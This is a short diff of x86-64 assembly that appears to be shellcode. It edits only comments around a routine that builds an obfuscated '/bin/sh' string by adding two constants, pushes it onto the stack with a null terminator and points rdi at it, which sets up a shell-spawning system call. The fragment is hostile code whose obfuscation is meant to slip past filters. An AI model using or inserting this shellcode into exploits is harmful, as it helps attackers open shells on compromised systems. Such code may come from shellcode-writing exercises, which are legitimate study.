@@ -29,11 +29,11 @@ _start:
     push rax
     pop rsi
 
-    mov rbx, 0x68732f2f5b31eefe ; Some string obfuscation
-    add rbx, 0x13377331
+    mov rbx, 0x68732f2f5b31eefe ; Obfuscated /bin/sh
+    add rbx, 0x13377331 ; Deobfuscate
 
-    push rax
-    push rbx
+    push rax ; Null byte to mark the end of the /bin/sh string
+    push rbx ; Put deobfuscated /bin/sh on stack
 
     push rsp
     pop rdi ; rdi points to /bin/sh
